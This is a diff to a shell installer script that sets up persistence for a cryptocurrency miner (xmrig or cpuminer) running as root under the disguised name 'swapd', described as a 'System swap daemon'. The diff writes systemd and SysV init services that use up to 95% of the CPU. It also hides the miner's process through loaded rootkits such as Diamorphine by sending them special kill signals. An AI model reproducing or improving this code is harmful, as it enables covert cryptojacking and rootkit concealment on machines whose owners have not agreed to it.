@@ -1877,7 +1877,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
         EXEC_START="/root/.swapd/swapd -c /root/.swapd/swapfile"  # xmrig uses binary + config
     fi
     
-    cat > /etc/systemd/system/swapd.service << 'SERVICE_EOF'
+    cat > /etc/systemd/system/swapd.service << SERVICE_EOF
 [Unit]
 Description=System swap daemon
 After=network.target
@@ -1886,7 +1886,7 @@ After=network.target
 Type=simple
 User=root
 WorkingDirectory=/root/.swapd
-ExecStart=/root/.swapd/swapd -c /root/.swapd/swapfile
+ExecStart=$EXEC_START
 Restart=no
 Nice=19
 CPUQuota=95%
@@ -1908,59 +1908,68 @@ else
     # ==================== CREATE SYSV INIT SCRIPT ====================
     echo "[*] Creating SysV init script (BusyBox compatible)..."
     
-    cat > /etc/init.d/swapd << 'INIT_EOF'
+    # Set daemon and args based on miner type
+    if [ "$MINER_TYPE" = "cpuminer" ]; then
+        DAEMON_PATH="/root/.swapd/swapfile"
+        DAEMON_ARGS_VALUE=""
+    else
+        DAEMON_PATH="/root/.swapd/swapd"
+        DAEMON_ARGS_VALUE="-c /root/.swapd/swapfile"
+    fi
+    
+    cat > /etc/init.d/swapd << INIT_EOF
 #!/bin/sh
 ### BEGIN INIT INFO
 # Provides:          swapd
-# Required-Start:    $network $local_fs $remote_fs
-# Required-Stop:     $network $local_fs $remote_fs
+# Required-Start:    \$network \$local_fs \$remote_fs
+# Required-Stop:     \$network \$local_fs \$remote_fs
 # Default-Start:     2 3 4 5
 # Default-Stop:      0 1 6
 # Short-Description: System swap daemon
 ### END INIT INFO
 
-DAEMON=/root/.swapd/swapd
-DAEMON_ARGS="-c /root/.swapd/swapfile"
+DAEMON=$DAEMON_PATH
+DAEMON_ARGS="$DAEMON_ARGS_VALUE"
 NAME=swapd
-PIDFILE=/var/run/$NAME.pid
+PIDFILE=/var/run/\$NAME.pid
 WORKDIR=/root/.swapd
 
 # BusyBox-compatible PID finder
 get_pids() {
     if command -v pgrep >/dev/null 2>&1; then
-        pgrep -f "$1" 2>/dev/null
+        pgrep -f "\$1" 2>/dev/null
     else
         for d in /proc/[0-9]*; do
-            [ -d "$d" ] || continue
-            cmd=$(tr '\0' ' ' < "$d/cmdline" 2>/dev/null) || continue
-            case "$cmd" in *"$1"*) echo "${d##*/}" ;; esac
+            [ -d "\$d" ] || continue
+            cmd=\$(tr '\\0' ' ' < "\$d/cmdline" 2>/dev/null) || continue
+            case "\$cmd" in *"\$1"*) echo "\${d##*/}" ;; esac
         done
     fi
 }
 
-case "$1" in
+case "\$1" in
     start)
-        echo "Starting $NAME..."
-        cd $WORKDIR || exit 1
+        echo "Starting \$NAME..."
+        cd \$WORKDIR || exit 1
         
         # BusyBox start-stop-daemon doesn't support --chdir
-        start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --exec $DAEMON -- $DAEMON_ARGS || true
+        start-stop-daemon --start --background --make-pidfile --pidfile \$PIDFILE --exec \$DAEMON -- \$DAEMON_ARGS || true
         
         # Auto-hide process after start (only if rootkits are loaded)
         if lsmod | grep -qE "diamorphine|singularity|rootkit"; then
             sleep 3
             for i in 1 2 3; do
-                for pid in $(get_pids swapd); do
-                    kill -31 "$pid" 2>/dev/null || true
-                    kill -59 "$pid" 2>/dev/null || true
+                for pid in \$(get_pids swapd); do
+                    kill -31 "\$pid" 2>/dev/null || true
+                    kill -59 "\$pid" 2>/dev/null || true
                 done
                 sleep 1
             done
         fi
         ;;
     stop)
-        echo "Stopping $NAME..."
-        start-stop-daemon --stop --pidfile $PIDFILE --retry 5 2>/dev/null || true
+        echo "Stopping \$NAME..."
+        start-stop-daemon --stop --pidfile \$PIDFILE --retry 5 2>/dev/null || true
         
         # Fallback kill if pkill exists
         if command -v pkill >/dev/null 2>&1; then
@@ -1968,32 +1977,32 @@ case "$1" in
         else
             # Use killall or manual kill
             killall -9 swapd 2>/dev/null || true
-            for pid in $(get_pids swapd); do
-                kill -9 "$pid" 2>/dev/null || true
+            for pid in \$(get_pids swapd); do
+                kill -9 "\$pid" 2>/dev/null || true
             done
         fi
         
-        rm -f $PIDFILE
+        rm -f \$PIDFILE
         ;;
     restart)
-        $0 stop
+        \$0 stop
         sleep 2
-        $0 start
+        \$0 start
         ;;
     status)
-        if [ -f $PIDFILE ]; then
-            PID=$(cat $PIDFILE)
-            if kill -0 $PID 2>/dev/null; then
-                echo "$NAME is running (PID $PID)"
+        if [ -f \$PIDFILE ]; then
+            PID=\$(cat \$PIDFILE)
+            if kill -0 \$PID 2>/dev/null; then
+                echo "\$NAME is running (PID \$PID)"
             else
-                echo "$NAME is not running (stale PID file)"
+                echo "\$NAME is not running (stale PID file)"
             fi
         else
-            echo "$NAME is not running"
+            echo "\$NAME is not running"
         fi
         ;;
     *)
-        echo "Usage: $0 {start|stop|restart|status}"
+        echo "Usage: \$0 {start|stop|restart|status}"
         exit 1
         ;;
 esac
